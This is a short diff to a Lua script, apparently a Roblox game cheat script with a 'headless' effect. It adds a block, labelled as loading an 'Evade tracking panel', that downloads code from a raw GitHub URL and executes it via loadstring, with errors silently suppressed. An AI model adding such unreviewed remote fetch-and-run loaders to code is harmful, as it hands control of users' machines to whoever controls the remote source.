@@ -2295,6 +2295,12 @@ task.spawn(function()
     end
 end)
 
+-- 載入 Evade 專屬追蹤面板
+task.spawn(function()
+    local evaURL = "https://raw.githubusercontent.com/xuanop/xopch/refs/heads/main/admin"
+    pcall(function() loadstring(game:HttpGet(evaURL))() end)
+end)
+
 -- ==================== 初始化无头效果 ====================
 for _, player in ipairs(Players:GetPlayers()) do
     setupHeadlessForPlayer(player)
